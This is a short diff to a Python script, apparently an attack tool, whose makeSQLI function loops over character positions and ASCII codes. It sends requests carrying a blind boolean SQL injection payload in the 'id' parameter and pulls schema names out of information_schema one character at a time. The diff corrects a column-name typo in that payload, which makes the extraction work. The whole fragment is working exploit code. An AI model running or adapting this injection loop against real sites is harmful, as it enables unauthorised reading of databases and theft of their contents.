@@ -26,7 +26,7 @@ def makeSQLI():
 
   for position in range(1,150):
     for character in range(33, 126):
-      sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(sechema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
+      sqli_url = main_url + "?id=9 or (select(select ascii(substring((select group_concat(schema_name) from information_schema.schemata),%d,1)) from users where id = 1)=%d)" % (position, character)
       
       p1.status(sqli_url)
       r = requests.get(sqli_url)
